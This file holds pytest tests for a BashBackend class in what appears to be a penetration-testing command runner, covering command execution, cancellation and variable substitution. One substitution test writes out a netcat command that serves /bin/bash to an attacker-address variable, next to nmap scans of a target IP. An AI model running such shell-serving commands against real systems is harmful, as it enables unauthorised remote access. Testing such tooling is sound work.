"""Tests for BashBackend."""

import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from wish_models import CommandState, LogFiles, Wish
from wish_models.test_factories import WishDoingFactory

from wish_command_execution.backend import BashBackend


class TestBashBackend:
    """Tests for BashBackend."""

    @pytest.fixture
    def backend(self):
        """Create a BashBackend instance."""
        return BashBackend()

    @pytest.fixture
    def wish(self):
        """Create a test wish."""
        wish = WishDoingFactory.create()
        wish.command_results = []  # Clear any existing command results
        return wish

    @pytest.fixture
    def log_files(self):
        """Create test log files."""
        return LogFiles(
            stdout=Path("/mock/log/dir/1.stdout"),
            stderr=Path("/mock/log/dir/1.stderr")
        )

    @pytest.mark.asyncio
    @patch("subprocess.Popen")
    @patch("builtins.open")
    async def test_execute_command(self, mock_open, mock_popen, backend, wish, log_files):
        """Test execute_command method.

        This test verifies that the execute_command method correctly executes
        a command and creates the necessary log files.
        """
        # Set up the mock Popen
        mock_process = MagicMock()
        mock_popen.return_value = mock_process

        # Set up mock file objects
        mock_stdout = MagicMock()
        mock_stderr = MagicMock()
        mock_open.return_value.__enter__.side_effect = [mock_stdout, mock_stderr]

        # Execute a command
        cmd = "echo 'Test command'"
        cmd_num = 1
        await backend.execute_command(wish, cmd, cmd_num, log_files)

        # Verify that Popen was called with the expected command
        mock_popen.assert_any_call(
            cmd,
            stdout=mock_stdout,
            stderr=mock_stderr,
            shell=True,
            text=True
        )

        # Verify that the command result was added to the wish
        assert len(wish.command_results) == 1
        assert wish.command_results[0].command == cmd
        assert wish.command_results[0].num == cmd_num

        # Verify that the command was added to running_commands
        assert cmd_num in backend.running_commands
        assert backend.running_commands[cmd_num][0] == mock_process

    @pytest.mark.asyncio
    @patch("subprocess.Popen")
    @patch("builtins.open")
    async def test_execute_command_subprocess_error(self, mock_open, mock_popen, backend, wish, log_files):
        """Test execute_command method with subprocess error.

        This test verifies that the execute_command method correctly handles
        subprocess errors.
        """
        # Set up the mock Popen to raise a subprocess error
        mock_popen.side_effect = subprocess.SubprocessError("Mock error")

        # Set up mock file objects
        mock_stdout = MagicMock()
        mock_stderr = MagicMock()
        mock_open.return_value.__enter__.side_effect = [mock_stdout, mock_stderr]

        # Execute a command
        cmd = "echo 'Test command'"
        cmd_num = 1
        await backend.execute_command(wish, cmd, cmd_num, log_files)

        # Verify that the command result was updated with the error state
        assert wish.command_results[0].state == CommandState.OTHERS

        # Verify that the command result was added to the wish
        assert len(wish.command_results) == 1
        assert wish.command_results[0].command == cmd
        assert wish.command_results[0].num == cmd_num

        # Verify that the command result was updated
        assert wish.command_results[0].state == CommandState.OTHERS
        assert wish.command_results[0].exit_code == 1

    @pytest.mark.asyncio
    async def test_check_running_commands(self, backend, wish):
        """Test check_running_commands method.

        This test verifies that the check_running_commands method correctly
        updates the status of running commands.
        """
        # Create mock process, result, and wish
        mock_process = MagicMock()
        mock_process.poll.return_value = 0  # Process has completed successfully

        mock_result = MagicMock()
        mock_result.finish = MagicMock()

        # Add to running_commands
        cmd_num = 1
        backend.running_commands[cmd_num] = (mock_process, mock_result, wish)

        # Check running commands
        await backend.check_running_commands()

        # Verify that poll was called
        mock_process.poll.assert_called_once()

        # Verify that finish was called
        mock_result.finish.assert_called_once()

        # Verify that the command was processed
        assert mock_result.finish.called

        # Verify that the command was removed from running_commands
        assert cmd_num not in backend.running_commands

    @pytest.mark.asyncio
    async def test_cancel_command(self, backend, wish):
        """Test cancel_command method.

        This test verifies that the cancel_command method correctly cancels
        a running command.
        """
        # Create mock process, result, and wish
        mock_process = MagicMock()
        mock_process.terminate = MagicMock()
        mock_process.kill = MagicMock()
        mock_process.poll.return_value = None  # Process is still running

        mock_result = MagicMock()
        mock_result.finish = MagicMock()

        # Add to running_commands
        cmd_num = 1
        backend.running_commands[cmd_num] = (mock_process, mock_result, wish)

        # Cancel the command
        result = await backend.cancel_command(wish, cmd_num)

        # Verify that terminate was called
        mock_process.terminate.assert_called_once()

        # Verify that finish was called
        mock_result.finish.assert_called_once()

        # Verify that the command was processed
        assert mock_result.finish.called

        # Verify that the command was removed from running_commands
        assert cmd_num not in backend.running_commands

        # Verify that the correct message was returned
        assert result == f"Command {cmd_num} cancelled."

    @pytest.mark.asyncio
    async def test_cancel_command_not_running(self, backend, wish):
        """Test cancel_command method when command is not running.

        This test verifies that the cancel_command method correctly handles
        the case where the command is not running.
        """
        # Cancel a command that is not running
        cmd_num = 1
        result = await backend.cancel_command(wish, cmd_num)

        # Verify that the correct message was returned
        assert result == f"Command {cmd_num} is not running."

    def test_replace_variables(self, backend):
        """Test _replace_variables method.

        This test verifies that the _replace_variables method correctly replaces
        variables in commands.
        """
        # Create a mock wish with context
        mock_wish = MagicMock(spec=Wish)
        mock_wish.context = {
            'target': {'rhost': '10.10.10.40'},
            'attacker': {'lhost': '10.10.14.13'}
        }

        # Test basic variable replacement
        command = "nmap -sV $TARGET_IP"
        expected = "nmap -sV 10.10.10.40"
        result = backend._replace_variables(command, mock_wish)
        assert result == expected

        # Test multiple variable replacement
        command = "nmap -sV $TARGET_IP && nc -lvp 4444 -e /bin/bash $LHOST"
        expected = "nmap -sV 10.10.10.40 && nc -lvp 4444 -e /bin/bash 10.10.14.13"
        result = backend._replace_variables(command, mock_wish)
        assert result == expected

        # Test with no variables
        command = "ls -la"
        expected = "ls -la"
        result = backend._replace_variables(command, mock_wish)
        assert result == expected

    def test_replace_variables_missing_values(self, backend):
        """Test _replace_variables method with missing values.

        This test verifies that the _replace_variables method correctly handles
        the case where variable values are missing.
        """
        # Create a mock wish with empty context
        mock_wish = MagicMock(spec=Wish)
        mock_wish.context = {
            'target': {},
            'attacker': {}
        }

        # Test with missing variable values
        command = "nmap -sV $TARGET_IP"
        expected = "nmap -sV $TARGET_IP"  # Should remain unchanged
        result = backend._replace_variables(command, mock_wish)
        assert result == expected

        # Test with no context
        mock_wish.context = None
        command = "nmap -sV $TARGET_IP"
        expected = "nmap -sV $TARGET_IP"  # Should remain unchanged
        result = backend._replace_variables(command, mock_wish)
        assert result == expected

    @pytest.mark.asyncio
    @patch("subprocess.Popen")
    @patch("builtins.open")
    async def test_execute_command_with_variable_replacement(self, mock_open, mock_popen, backend, wish, log_files):
        """Test execute_command method with variable replacement.

        This test verifies that the execute_command method correctly replaces
        variables in commands before execution.
        """
        # Set up the mock Popen
        mock_process = MagicMock()
        mock_popen.return_value = mock_process

        # Set up mock file objects
        mock_stdout = MagicMock()
        mock_stderr = MagicMock()
        mock_open.return_value.__enter__.side_effect = [mock_stdout, mock_stderr]

        # モックで_replace_variablesメソッドをパッチして、特定の入力に対して特定の出力を返すようにする
        with patch.object(backend, '_replace_variables') as mock_replace:
            # 変数置換の結果をモックする
            mock_replace.return_value = "nmap -sV 10.10.10.40"

            # Execute a command with variables
            cmd = "nmap -sV $TARGET_IP"
            cmd_num = 1
            await backend.execute_command(wish, cmd, cmd_num, log_files)

            # _replace_variablesが正しい引数で呼ばれたことを確認
            mock_replace.assert_called_once_with(cmd, wish)

            # Verify that Popen was called with the replaced command
            mock_popen.assert_any_call(
                "nmap -sV 10.10.10.40",
                stdout=mock_stdout,
                stderr=mock_stderr,
                shell=True,
                text=True
            )
            args, kwargs = mock_popen.call_args
            assert args[0] == "nmap -sV 10.10.10.40"
